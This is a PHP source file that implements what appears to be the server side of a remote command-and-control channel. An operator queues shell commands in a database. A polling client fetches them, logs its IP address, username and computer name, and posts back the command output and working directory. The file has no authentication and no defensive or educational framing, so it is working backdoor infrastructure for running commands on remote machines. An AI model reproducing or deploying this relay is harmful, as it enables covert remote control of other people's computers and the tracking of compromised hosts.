<?php

include 'database.php';

$db = null;

try {
    $db = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_password);
} catch (\PDOException $e) {
    echo $e->getMessage();
}

$db->query('create table if not exists commands (id int primary key auto_increment, command varchar(1024) not null, output text, next_pwd varchar(256), complete boolean default false)');
$db->query('create table if not exists requests (id int primary key auto_increment, ip varchar(64) not null, username varchar(64) not null, computername varchar(64) not null, requested_at timestamp)');

$data = [];

switch($_GET["action"]) {
    case "send_cmd":
        try {        
            $stmt = $db->prepare('insert into commands (command) values (?)');
            $stmt->execute([$_POST["command"]]);

            $data["id"] = $db->lastInsertId();
        
        } catch (\PDOException $e) {
            echo $e->getMessage();
        }
        break;
    case "pull_output":
        try {
            $stmt = $db->prepare('select output, complete, next_pwd from commands where id = ?');
            $stmt->execute([$_GET["id"]]);

            if($values = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $data = $values;
            }

        } catch (\PDOException $e) {
            echo $e->getMessage();
        }
        break;
    case "pull_cmd":
        try {
            $stmt = $db->prepare('insert into requests (ip, username, computername) values (?, ?, ?)');
            $stmt->execute([$_SERVER["REMOTE_ADDR"], $_GET["username"], $_GET["computername"]]);

            $stmt = $db->prepare('select id, command from commands where not complete order by id asc limit 1');
            $stmt->execute();

            if($values = $stmt->fetch()) {
                $id = $values["id"];
                $command = $values["command"];

                echo $id . '|' . $command;
            }
            exit;        
        } catch (\PDOException $e) {
            echo $e->getMessage();
        }
        break;
    case "send_output":
        $stmt = $db->prepare('update commands set output = ?, next_pwd = ?, complete = true where id = ?');
        $stmt->execute([$_POST["output"], $_POST["path"], $_POST["id"]]);

        exit;
        break;
    case "check_connection":
        $stmt = $db->prepare('select ip, username, computername from requests where requested_at > DATE_SUB(NOW(), interval 3 second) order by requested_at desc limit 1');
        $stmt->execute();

        if($values = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $data = $values;
            $data["connected"] = TRUE;
        } else {
            $data["connected"] = FALSE;
        }

        break;
}

echo json_encode($data);